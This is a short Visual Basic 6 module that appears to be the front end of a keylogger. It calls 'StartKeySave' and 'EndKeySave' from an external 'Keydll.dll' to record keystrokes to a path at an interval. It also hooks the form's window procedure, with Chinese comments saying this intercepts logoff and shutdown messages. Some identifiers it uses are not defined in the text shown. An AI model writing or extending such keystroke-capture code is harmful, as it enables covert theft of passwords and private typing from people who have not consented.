Attribute VB_Name = "Module1"
Private Declare Function StartKeySave Lib "Keydll.dll" _
    (ByVal interval As Long, _
    ByVal path As Long, _
    ByVal T_only As Long) As Long
    
Private Declare Function EndKeySave Lib "Keydll.dll" () As Long
    

Sub Main()
Dim a As Long
a = StartKeySave(10, 2, 1)

Dim ret As Long
'记录原来的Window Procedure的位址
preWinProc = GetWindowLong(Form1.hwnd, GWL_WNDPROC)
'设定form的window Procedure到wndproc
ret = SetWindowLong(Form1.hwnd, GWL_WNDPROC, AddressOf wndproc)
'专门用于处理注销、关机消息截获及处理事件__结束

End Sub
Sub OnEnd()
Dim a As Long
a = CStr(EndKeySave())
End Sub
